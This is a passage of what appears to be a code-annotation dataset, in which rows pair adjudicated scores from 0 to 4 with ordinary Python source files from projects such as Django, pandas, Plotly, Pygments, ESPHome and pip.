    @pytest.mark.parametrize(""name"", ""t0,t1,t2,t4,s0,s1,s2,s4"".split("",""))
    def test_all_f77(self, name):
        self.check_function(getattr(self.module, name))

    @pytest.mark.slow
    @pytest.mark.parametrize(""name"",
                             ""t0,t1,t2,t4,t8,s0,s1,s2,s4,s8"".split("",""))
    def test_all_f90(self, name):
        self.check_function(getattr(self.module.f90_return_logical, name))"
59	adjudicated	2	"from . import engines
from .exceptions import TemplateDoesNotExist


def get_template(template_name, using=None):
    """"""
    Load and return a template for the given name.

    Raise TemplateDoesNotExist if no such template exists.
    """"""
    chain = []
    engines = _engine_list(using)
    for engine in engines:
        try:
            return engine.get_template(template_name)
        except TemplateDoesNotExist as e:
            chain.append(e)

    raise TemplateDoesNotExist(template_name, chain=chain)


def select_template(template_name_list, using=None):
    """"""
    Load and return a template for one of the given names.

    Try names in order and return the first template found.

    Raise TemplateDoesNotExist if no such template exists.
    """"""
    if isinstance(template_name_list, str):
        raise TypeError(
            'select_template() takes an iterable of template names but got a '
            'string: %r. Use get_template() if you want to load a single '
            'template by name.' % template_name_list
        )

    chain = []
    engines = _engine_list(using)
    for template_name in template_name_list:
        for engine in engines:
            try:
                return engine.get_template(template_name)
            except TemplateDoesNotExist as e:
                chain.append(e)

    if template_name_list:
        raise TemplateDoesNotExist(', '.join(template_name_list), chain=chain)
    else:
        raise TemplateDoesNotExist(""No template names provided"")


def render_to_string(template_name, context=None, request=None, using=None):
    """"""
    Load a template and render it with a context. Return a string.

    template_name may be a string or a list of strings.
    """"""
    if isinstance(template_name, (list, tuple)):
        template = select_template(template_name, using=using)
    else:
        template = get_template(template_name, using=using)
    return template.render(context, request)


def _engine_list(using=None):
    return engines.all() if using is None else [engines[using]]"
119	adjudicated	2	"""""""
    pygments.lexers.x10
    ~~~~~~~~~~~~~~~~~~~

    Lexers for the X10 programming language.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer
from pygments.token import Text, Comment, Keyword, String

__all__ = ['X10Lexer']


class X10Lexer(RegexLexer):
    """"""
    For the X10 language.

    .. versionadded:: 2.2
    """"""

    name = 'X10'
    url = 'http://x10-lang.org/'
    aliases = ['x10', 'xten']
    filenames = ['*.x10']
    mimetypes = ['text/x-x10']

    keywords = (
        'as', 'assert', 'async', 'at', 'athome', 'ateach', 'atomic',
        'break', 'case', 'catch', 'class', 'clocked', 'continue',
        'def', 'default', 'do', 'else', 'final', 'finally', 'finish',
        'for', 'goto', 'haszero', 'here', 'if', 'import', 'in',
        'instanceof', 'interface', 'isref', 'new', 'offer',
        'operator', 'package', 'return', 'struct', 'switch', 'throw',
        'try', 'type', 'val', 'var', 'when', 'while'
    )

    types = (
        'void'
    )

    values = (
        'false', 'null', 'self', 'super', 'this', 'true'
    )

    modifiers = (
        'abstract', 'extends', 'implements', 'native', 'offers',
        'private', 'property', 'protected', 'public', 'static',
        'throws', 'transient'
    )

    tokens = {
        'root': [
            (r'[^\S\n]+', Text),
            (r'//.*?\n', Comment.Single),
            (r'/\*(.|\n)*?\*/', Comment.Multiline),
            (r'\b(%s)\b' % '|'.join(keywords), Keyword),
            (r'\b(%s)\b' % '|'.join(types), Keyword.Type),
            (r'\b(%s)\b' % '|'.join(values), Keyword.Constant),
            (r'\b(%s)\b' % '|'.join(modifiers), Keyword.Declaration),
            (r'""(\\\\|\\[^\\]|[^""\\])*""', String),
            (r""'\\.'|'[^\\]'|'\\u[0-9a-fA-F]{4}'"", String.Char),
            (r'.', Text)
        ],
    }"
288	adjudicated	0	"import esphome.codegen as cg
import esphome.config_validation as cv
from esphome import pins
from esphome.components import display
from esphome.const import (
    CONF_CLK_PIN,
    CONF_DIO_PIN,
    CONF_ID,
    CONF_LAMBDA,
    CONF_INTENSITY,
    CONF_INVERTED,
    CONF_LENGTH,
)

CODEOWNERS = [""@glmnet""]

tm1637_ns = cg.esphome_ns.namespace(""tm1637"")
TM1637Display = tm1637_ns.class_(""TM1637Display"", cg.PollingComponent)
TM1637DisplayRef = TM1637Display.operator(""ref"")

CONFIG_SCHEMA = display.BASIC_DISPLAY_SCHEMA.extend(
    {
        cv.GenerateID(): cv.declare_id(TM1637Display),
        cv.Optional(CONF_INTENSITY, default=7): cv.All(
            cv.uint8_t, cv.Range(min=0, max=7)
        ),
        cv.Optional(CONF_INVERTED, default=False): cv.boolean,
        cv.Optional(CONF_LENGTH, default=6): cv.All(cv.uint8_t, cv.Range(min=1, max=6)),
        cv.Required(CONF_CLK_PIN): pins.gpio_output_pin_schema,
        cv.Required(CONF_DIO_PIN): pins.gpio_output_pin_schema,
    }
).extend(cv.polling_component_schema(""1s""))


async def to_code(config):
    var = cg.new_Pvariable(config[CONF_ID])
    await cg.register_component(var, config)
    await display.register_display(var, config)

    clk = await cg.gpio_pin_expression(config[CONF_CLK_PIN])
    cg.add(var.set_clk_pin(clk))
    dio = await cg.gpio_pin_expression(config[CONF_DIO_PIN])
    cg.add(var.set_dio_pin(dio))

    cg.add(var.set_intensity(config[CONF_INTENSITY]))
    cg.add(var.set_inverted(config[CONF_INVERTED]))
    cg.add(var.set_length(config[CONF_LENGTH]))

    if CONF_LAMBDA in config:
        lambda_ = await cg.process_lambda(
            config[CONF_LAMBDA], [(TM1637DisplayRef, ""it"")], return_type=cg.void
        )
        cg.add(var.set_writer(lambda_))"
298	adjudicated	2	"import _plotly_utils.basevalidators


class InsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""insidetextfont"", parent_name=""bar"", **kwargs):
        super(InsidetextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Insidetextfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
109	adjudicated	2	"import _plotly_utils.basevalidators


class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""textfont"", parent_name=""pie"", **kwargs):
        super(TextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
49	adjudicated	4	"import inspect
import itertools
from collections import OrderedDict

from decorator import decorator


class ValidationFailure(Exception):
    def __init__(self, func, args):
        self.func = func
        self.__dict__.update(args)

    def __repr__(self):
        return u'ValidationFailure(func={func}, args={args})'.format(
            func=self.func.__name__,
            args=dict(
                [(k, v) for (k, v) in self.__dict__.items() if k != 'func']
            )
        )

    def __str__(self):
        return repr(self)

    def __unicode__(self):
        return repr(self)

    def __bool__(self):
        return False

    def __nonzero__(self):
        return False


def func_args_as_dict(func, args, kwargs):
    """"""
    Return given function's positional and key value arguments as an ordered
    dictionary.
    """"""
    _getargspec = inspect.getfullargspec

    arg_names = list(
        OrderedDict.fromkeys(
            itertools.chain(
                _getargspec(func)[0],
                kwargs.keys()
            )
        )
    )
    return OrderedDict(
        list(zip(arg_names, args)) +
        list(kwargs.items())
    )


def validator(func, *args, **kwargs):
    """"""
    A decorator that makes given function validator.

    Whenever the given function is called and returns ``False`` value
    this decorator returns :class:`ValidationFailure` object.

    Example::

        >>> @validator
        ... def even(value):
        ...     return not (value % 2)

        >>> even(4)
        True

        >>> even(5)
        ValidationFailure(func=even, args={'value': 5})

    :param func: function to decorate
    :param args: positional function arguments
    :param kwargs: key value function arguments
    """"""
    def wrapper(func, *args, **kwargs):
        value = func(*args, **kwargs)
        if not value:
            return ValidationFailure(
                func, func_args_as_dict(func, args, kwargs)
            )
        return True
    return decorator(wrapper, func)"
158	adjudicated	1	"import numpy as np
import pytest

import pandas as pd
import pandas._testing as tm
from pandas.arrays import BooleanArray
from pandas.tests.arrays.masked_shared import ComparisonOps


@pytest.fixture
def data():
    """"""Fixture returning boolean array with valid and missing data""""""
    return pd.array(
        [True, False] * 4 + [np.nan] + [True, False] * 44 + [np.nan] + [True, False],
        dtype=""boolean"",
    )


@pytest.fixture
def dtype():
    """"""Fixture returning BooleanDtype""""""
    return pd.BooleanDtype()


class TestComparisonOps(ComparisonOps):
    def test_compare_scalar(self, data, comparison_op):
        self._compare_other(data, comparison_op, True)

    def test_compare_array(self, data, comparison_op):
        other = pd.array([True] * len(data), dtype=""boolean"")
        self._compare_other(data, comparison_op, other)
        other = np.array([True] * len(data))
        self._compare_other(data, comparison_op, other)
        other = pd.Series([True] * len(data))
        self._compare_other(data, comparison_op, other)

    @pytest.mark.parametrize(""other"", [True, False, pd.NA])
    def test_scalar(self, other, comparison_op, dtype):
        ComparisonOps.test_scalar(self, other, comparison_op, dtype)

    def test_array(self, comparison_op):
        op = comparison_op
        a = pd.array([True] * 3 + [False] * 3 + [None] * 3, dtype=""boolean"")
        b = pd.array([True, False, None] * 3, dtype=""boolean"")

        result = op(a, b)

        values = op(a._data, b._data)
        mask = a._mask | b._mask
        expected = BooleanArray(values, mask)
        tm.assert_extension_array_equal(result, expected)

        # ensure we haven't mutated anything inplace
        result[0] = None
        tm.assert_extension_array_equal(
            a, pd.array([True] * 3 + [False] * 3 + [None] * 3, dtype=""boolean"")
        )
        tm.assert_extension_array_equal(
            b, pd.array([True, False, None] * 3, dtype=""boolean"")
        )"
389	adjudicated	0	"import cv2
from cvzone.HandTrackingModule import HandDetector
from cvzone.ClassificationModule import Classifier
import numpy as np
import math
cap = cv2.VideoCapture(0)
detector = HandDetector(maxHands=1)
classifier = Classifier(""keras_model.h5"", ""labels.txt"")

offset = 20
imgSize = 300

folder = ""Data/C""
counter = 0

labels = [""A"", ""B"", ""C""]

while True:
    success, img = cap.read()
    imgOutput = img.copy()
    hands, img = detector.findHands(img)
    if hands:
        hand = hands[0]
        x, y, w, h = hand['bbox']

        imgWhite = np.ones((imgSize, imgSize, 3), np.uint8) * 255
        imgCrop = img[y - offset:y + h + offset, x - offset:x + w + offset]

        imgCropShape = imgCrop.shape

        aspectRatio = h / w

        if aspectRatio > 1:
            k = imgSize / h
            wCal = math.ceil(k * w)
            imgResize = cv2.resize(imgCrop, (wCal, imgSize))
            imgResizeShape = imgResize.shape
            wGap = math.ceil((imgSize - wCal) / 2)
            imgWhite[:, wGap:wCal + wGap] = imgResize
            prediction, index = classifier.getPrediction(imgWhite, draw=False)
            print(prediction, index)

        else:
            k = imgSize / w
            hCal = math.ceil(k * h)
            imgResize = cv2.resize(imgCrop, (imgSize, hCal))
            imgResizeShape = imgResize.shape
            hGap = math.ceil((imgSize - hCal) / 2)
            imgWhite[hGap:hCal + hGap, :] = imgResize
            prediction, index = classifier.getPrediction(imgWhite, draw=False)

        cv2.rectangle(imgOutput, (x - offset, y - offset-50),
                      (x - offset+90, y - offset-50+50), (255, 0, 255), cv2.FILLED)
        cv2.putText(imgOutput, labels[index], (x, y -26), cv2.FONT_HERSHEY_COMPLEX, 1.7, (255, 255, 255), 2)
        cv2.rectangle(imgOutput, (x-offset, y-offset),
                      (x + w+offset, y + h+offset), (255, 0, 255), 4)


        cv2.imshow(""ImageCrop"", imgCrop)
        cv2.imshow(""ImageWhite"", imgWhite)

    cv2.imshow(""Image"", imgOutput)
    cv2.waitKey(1)"
18	adjudicated	1	"#!/usr/bin/env python3

import datetime

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes

private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)

public_key = private_key.public_key()

pem_private = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption()
)

pem_public = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

with open('/tmp/ca.key', 'wb') as out:
    out.write(pem_private)

with open('/tmp/ca.pub', 'wb') as out:
    out.write(pem_public)

print('Created files in /tmp/ca.key /tmp/ca.pub /tmp/ca.cert')

# Various details about who we are. For a self-signed certificate the
# subject and issuer are always the same.
subject = issuer = x509.Name([
    x509.NameAttribute(NameOID.COUNTRY_NAME, ""AR""),
    x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, ""BA""),
    x509.NameAttribute(NameOID.LOCALITY_NAME, ""Buenos Aires""),
    x509.NameAttribute(NameOID.ORGANIZATION_NAME, ""Vulpy by Securetia""),
    x509.NameAttribute(NameOID.COMMON_NAME, ""www.securetia.com""),
])

cert = x509.CertificateBuilder().subject_name(subject)
cert = cert.issuer_name(issuer)
cert = cert.public_key(public_key)
cert = cert.serial_number(x509.random_serial_number())
cert = cert.not_valid_before(datetime.datetime.utcnow())
cert = cert.not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=30))
cert = cert.sign(private_key, hashes.SHA256(), default_backend())

# Write our certificate out to disk.
with open('/tmp/ca.cert', 'wb') as out:
    out.write(cert.public_bytes(serialization.Encoding.PEM))
"
496	adjudicated	4	"# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Default TEST_CONFIG_OVERRIDE for python repos.

# You can copy this file into your directory, then it will be imported from
# the noxfile.py.

# The source of truth:
# https://github.com/GoogleCloudPlatform/python-docs-samples/blob/main/noxfile_config.py

TEST_CONFIG_OVERRIDE = {
    # You can opt out from the test for specific Python versions.
    ""ignored_versions"": [""2.7"", ""3.6"", ""3.9"", ""3.10"", ""3.11""],
    # Old samples are opted out of enforcing Python type hints
    # All new samples should feature them
    ""enforce_type_hints"": False,
    # An envvar key for determining the project id to use. Change it
    # to 'BUILD_SPECIFIC_GCLOUD_PROJECT' if you want to opt in using a
    # build specific Cloud project. You can also use your own string
    # to use your own Cloud project.
    ""gcloud_project_env"": ""GOOGLE_CLOUD_PROJECT"",
    # 'gcloud_project_env': 'BUILD_SPECIFIC_GCLOUD_PROJECT',
    # If you need to use a specific version of pip,
    # change pip_version_override to the string representation
    # of the version number, for example, ""20.2.4""
    ""pip_version_override"": None,
    # A dictionary you want to inject into your test. Don't put any
    # secrets here. These values will override predefined values.
    ""envs"": {},
}"
465	adjudicated	0	"# Copyright (c) Meta Platforms, Inc. and affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

import dataclasses

from textwrap import dedent

import viktor._vendor.libcst as cst
from viktor._vendor.libcst.metadata import AccessorProvider, MetadataWrapper
from viktor._vendor.libcst.testing.utils import data_provider, UnitTest


class DependentVisitor(cst.CSTVisitor):
    METADATA_DEPENDENCIES = (AccessorProvider,)

    def __init__(self, *, test: UnitTest) -> None:
        self.test = test

    def on_visit(self, node: cst.CSTNode) -> bool:
        for f in dataclasses.fields(node):
            child = getattr(node, f.name)
            if type(child) is cst.CSTNode:
                accessor = self.get_metadata(AccessorProvider, child)
                self.test.assertEqual(accessor, f.name)

        return True


class AccessorProviderTest(UnitTest):
    @data_provider(
        (
            (
                """"""
                foo = 'toplevel'
                fn1(foo)
                fn2(foo)
                def fn_def():
                    foo = 'shadow'
                    fn3(foo)
                """""",
            ),
            (
                """"""
                global_var = None
                @cls_attr
                class Cls(cls_attr, kwarg=cls_attr):
                    cls_attr = 5
                    def f():
                        pass
                """""",
            ),
            (
                """"""
                iterator = None
                condition = None
                [elt for target in iterator if condition]
                {elt for target in iterator if condition}
                {elt: target for target in iterator if condition}
                (elt for target in iterator if condition)
                """""",
            ),
        )
    )
    def test_accessor_provier(self, code: str) -> None:
        wrapper = MetadataWrapper(cst.parse_module(dedent(code)))
        wrapper.visit(DependentVisitor(test=self))"
434	adjudicated	4	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = ""d F Y""  # 25 Ottobre 2006
TIME_FORMAT = ""H:i""  # 14:30
DATETIME_FORMAT = ""l d F Y H:i""  # MercoledÃ¬ 25 Ottobre 2006 14:30
YEAR_MONTH_FORMAT = ""F Y""  # Ottobre 2006
MONTH_DAY_FORMAT = ""j F""  # 25 Ottobre
SHORT_DATE_FORMAT = ""d/m/Y""  # 25/12/2009
SHORT_DATETIME_FORMAT = ""d/m/Y H:i""  # 25/10/2009 14:30
FIRST_DAY_OF_WEEK = 1  # LunedÃ¬

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
DATE_INPUT_FORMATS = [
    ""%d/%m/%Y"",  # '25/10/2006'
    ""%Y/%m/%d"",  # '2006/10/25'
    ""%d-%m-%Y"",  # '25-10-2006'
    ""%Y-%m-%d"",  # '2006-10-25'
    ""%d-%m-%y"",  # '25-10-06'
    ""%d/%m/%y"",  # '25/10/06'
]
DATETIME_INPUT_FORMATS = [
    ""%d/%m/%Y %H:%M:%S"",  # '25/10/2006 14:30:59'
    ""%d/%m/%Y %H:%M:%S.%f"",  # '25/10/2006 14:30:59.000200'
    ""%d/%m/%Y %H:%M"",  # '25/10/2006 14:30'
    ""%d/%m/%y %H:%M:%S"",  # '25/10/06 14:30:59'
    ""%d/%m/%y %H:%M:%S.%f"",  # '25/10/06 14:30:59.000200'
    ""%d/%m/%y %H:%M"",  # '25/10/06 14:30'
    ""%Y-%m-%d %H:%M:%S"",  # '2006-10-25 14:30:59'
    ""%Y-%m-%d %H:%M:%S.%f"",  # '2006-10-25 14:30:59.000200'
    ""%Y-%m-%d %H:%M"",  # '2006-10-25 14:30'
    ""%d-%m-%Y %H:%M:%S"",  # '25-10-2006 14:30:59'
    ""%d-%m-%Y %H:%M:%S.%f"",  # '25-10-2006 14:30:59.000200'
    ""%d-%m-%Y %H:%M"",  # '25-10-2006 14:30'
    ""%d-%m-%y %H:%M:%S"",  # '25-10-06 14:30:59'
    ""%d-%m-%y %H:%M:%S.%f"",  # '25-10-06 14:30:59.000200'
    ""%d-%m-%y %H:%M"",  # '25-10-06 14:30'
]
DECIMAL_SEPARATOR = "",""
THOUSAND_SEPARATOR = "".""
NUMBER_GROUPING = 3"
400	adjudicated	4	"""""""Stuff that differs in different Python versions and platform
distributions.""""""

import logging
import os
import sys

__all__ = [""get_path_uid"", ""stdlib_pkgs"", ""WINDOWS""]


logger = logging.getLogger(__name__)


def has_tls() -> bool:
    try:
        import _ssl  # noqa: F401  # ignore unused

        return True
    except ImportError:
        pass

    from pip._vendor.urllib3.util import IS_PYOPENSSL

    return IS_PYOPENSSL


def get_path_uid(path: str) -> int:
    """"""
    Return path's uid.

    Does not follow symlinks:
        https://github.com/pypa/pip/pull/935#discussion_r5307003

    Placed this function in compat due to differences on AIX and
    Jython, that should eventually go away.

    :raises OSError: When path is a symlink or can't be read.
    """"""
    if hasattr(os, ""O_NOFOLLOW""):
        fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW)
        file_uid = os.fstat(fd).st_uid
        os.close(fd)
    else:  # AIX and Jython
        # WARNING: time of check vulnerability, but best we can do w/o NOFOLLOW
        if not os.path.islink(path):
            # older versions of Jython don't have `os.fstat`
            file_uid = os.stat(path).st_uid
        else:
            # raise OSError for parity with os.O_NOFOLLOW above
            raise OSError(f""{path} is a symlink; Will not return uid for symlinks"")
    return file_uid


# packages in the stdlib that may have installation metadata, but should not be
# considered 'installed'.  this theoretically could be determined based on
# dist.location (py27:`sysconfig.get_paths()['stdlib']`,
# py26:sysconfig.get_config_vars('LIBDEST')), but fear platform variation may
# make this ineffective, so hard-coding
stdlib_pkgs = {""python"", ""wsgiref"", ""argparse""}


# windows detection, covers cpython and ironpython
WINDOWS = sys.platform.startswith(""win"") or (sys.platform == ""cli"" and os.name == ""nt"")"
451	adjudicated	2	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""contour"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
511	adjudicated	3	"#!/usr/bin/env python3
""""""Session authentication with expiration
and storage support module for the API.
""""""
from flask import request
from datetime import datetime, timedelta

from models.user_session import UserSession
from .session_exp_auth import SessionExpAuth


class SessionDBAuth(SessionExpAuth):
    """"""Session authentication class with expiration and storage support.
    """"""

    def create_session(self, user_id=None) -> str:
        """"""Creates and stores a session id for the user.
        """"""
        session_id = super().create_session(user_id)
        if type(session_id) == str:
            kwargs = {
                'user_id': user_id,
                'session_id': session_id,
            }
            user_session = UserSession(**kwargs)
            user_session.save()
            return session_id

    def user_id_for_session_id(self, session_id=None):
        """"""Retrieves the user id of the user associated with
        a given session id.
        """"""
        try:
            sessions = UserSession.search({'session_id': session_id})
        except Exception:
            return None
        if len(sessions) <= 0:
            return None
        cur_time = datetime.now()
        time_span = timedelta(seconds=self.session_duration)
        exp_time = sessions[0].created_at + time_span
        if exp_time < cur_time:
            return None
        return sessions[0].user_id

    def destroy_session(self, request=None) -> bool:
        """"""Destroys an authenticated session.
        """"""
        session_id = self.session_cookie(request)
        try:
            sessions = UserSession.search({'session_id': session_id})
        except Exception:
            return False
        if len(sessions) <= 0:
            return False
        sessions[0].remove()
        return True"
500	adjudicated	3	"from MySQLdb.constants import FIELD_TYPE

from django.contrib.gis.gdal import OGRGeomType
from django.db.backends.mysql.introspection import DatabaseIntrospection


class MySQLIntrospection(DatabaseIntrospection):
    # Updating the data_types_reverse dictionary with the appropriate
    # type for Geometry fields.
    data_types_reverse = DatabaseIntrospection.data_types_reverse.copy()
    data_types_reverse[FIELD_TYPE.GEOMETRY] = 'GeometryField'

    def get_geometry_type(self, table_name, description):
        with self.connection.cursor() as cursor:
            # In order to get the specific geometry type of the field,
            # we introspect on the table definition using `DESCRIBE`.
            cursor.execute('DESCRIBE %s' %
                           self.connection.ops.quote_name(table_name))
            # Increment over description info until we get to the geometry
            # column.
            for column, typ, null, key, default, extra in cursor.fetchall():
                if column == description.name:
                    # Using OGRGeomType to convert from OGC name to Django field.
                    # MySQL does not support 3D or SRIDs, so the field params
                    # are empty.
                    field_type = OGRGeomType(typ).django
                    field_params = {}
                    break
        return field_type, field_params

    def supports_spatial_index(self, cursor, table_name):
        # Supported with MyISAM/Aria, or InnoDB on MySQL 5.7.5+/MariaDB 10.2.2+
        storage_engine = self.get_storage_engine(cursor, table_name)
        if storage_engine == 'InnoDB':
            return self.connection.mysql_version >= (
                (10, 2, 2) if self.connection.mysql_is_mariadb else (5, 7, 5)
            )
        return storage_engine in ('MyISAM', 'Aria')"
440	adjudicated	3	"from typing import List, Optional

from .base import BaseDistribution, BaseEnvironment, FilesystemWheel, MemoryWheel, Wheel

__all__ = [
    ""BaseDistribution"",
    ""BaseEnvironment"",
    ""FilesystemWheel"",
    ""MemoryWheel"",
    ""Wheel"",
    ""get_default_environment"",
    ""get_environment"",
    ""get_wheel_distribution"",
]


def get_default_environment() -> BaseEnvironment:
    """"""Get the default representation for the current environment.

    This returns an Environment instance from the chosen backend. The default
    Environment instance should be built from ``sys.path`` and may use caching
    to share instance state accorss calls.
    """"""
    from .pkg_resources import Environment

    return Environment.default()


def get_environment(paths: Optional[List[str]]) -> BaseEnvironment:
    """"""Get a representation of the environment specified by ``paths``.

    This returns an Environment instance from the chosen backend based on the
    given import paths. The backend must build a fresh instance representing
    the state of installed distributions when this function is called.
    """"""
    from .pkg_resources import Environment

    return Environment.from_paths(paths)


def get_directory_distribution(directory: str) -> BaseDistribution:
    """"""Get the distribution metadata representation in the specified directory.

    This returns a Distribution instance from the chosen backend based on
    the given on-disk ``.dist-info`` directory.
    """"""
    from .pkg_resources import Distribution

    return Distribution.from_directory(directory)


def get_wheel_distribution(wheel: Wheel, canonical_name: str) -> BaseDistribution:
    """"""Get the representation of the specified wheel's distribution metadata.

    This returns a Distribution instance from the chosen backend based on
    the given wheel's ``.dist-info`` directory.

    :param canonical_name: Normalized project name of the given wheel.
    """"""
    from .pkg_resources import Distribution

    return Distribution.from_wheel(wheel, canonical_name)"
411	adjudicated	0	"from . import DefaultTable
import sys
import array
import logging


log = logging.getLogger(__name__)


class table__l_o_c_a(DefaultTable.DefaultTable):

    dependencies = [""glyf""]

    def decompile(self, data, ttFont):
        longFormat = ttFont[""head""].indexToLocFormat
        if longFormat:
            format = ""I""
        else:
            format = ""H""
        locations = array.array(format)
        locations.frombytes(data)
        if sys.byteorder != ""big"":
            locations.byteswap()
        if not longFormat:
            l = array.array(""I"")
            for i in range(len(locations)):
                l.append(locations[i] * 2)
            locations = l
        if len(locations) < (ttFont[""maxp""].numGlyphs + 1):
            log.warning(
                ""corrupt 'loca' table, or wrong numGlyphs in 'maxp': %d %d"",
                len(locations) - 1,
                ttFont[""maxp""].numGlyphs,
            )
        self.locations = locations

    def compile(self, ttFont):
        try:
            max_location = max(self.locations)
        except AttributeError:
            self.set([])
            max_location = 0
        if max_location < 0x20000 and all(l % 2 == 0 for l in self.locations):
            locations = array.array(""H"")
            for i in range(len(self.locations)):
                locations.append(self.locations[i] // 2)
            ttFont[""head""].indexToLocFormat = 0
        else:
            locations = array.array(""I"", self.locations)
            ttFont[""head""].indexToLocFormat = 1
        if sys.byteorder != ""big"":
            locations.byteswap()
        return locations.tobytes()

    def set(self, locations):
        self.locations = array.array(""I"", locations)

    def toXML(self, writer, ttFont):
        writer.comment(""The 'loca' table will be calculated by the compiler"")
        writer.newline()

    def __getitem__(self, index):
        return self.locations[index]

    def __len__(self):
        return len(self.locations)"
425	adjudicated	1	"from datetime import (
    datetime,
    timedelta,
)

from pandas import (
    DatetimeIndex,
    NaT,
    Timestamp,
)
import pandas._testing as tm


def test_unique(tz_naive_fixture):

    idx = DatetimeIndex([""2017""] * 2, tz=tz_naive_fixture)
    expected = idx[:1]

    result = idx.unique()
    tm.assert_index_equal(result, expected)
    # GH#21737
    # Ensure the underlying data is consistent
    assert result[0] == expected[0]


def test_index_unique(rand_series_with_duplicate_datetimeindex):
    dups = rand_series_with_duplicate_datetimeindex
    index = dups.index

    uniques = index.unique()
    expected = DatetimeIndex(
        [
            datetime(2000, 1, 2),
            datetime(2000, 1, 3),
            datetime(2000, 1, 4),
            datetime(2000, 1, 5),
        ]
    )
    assert uniques.dtype == ""M8[ns]""  # sanity
    tm.assert_index_equal(uniques, expected)
    assert index.nunique() == 4

    # GH#2563
    assert isinstance(uniques, DatetimeIndex)

    dups_local = index.tz_localize(""US/Eastern"")
    dups_local.name = ""foo""
    result = dups_local.unique()
    expected = DatetimeIndex(expected, name=""foo"")
    expected = expected.tz_localize(""US/Eastern"")
    assert result.tz is not None
    assert result.name == ""foo""
    tm.assert_index_equal(result, expected)


def test_index_unique2():
    # NaT, note this is excluded
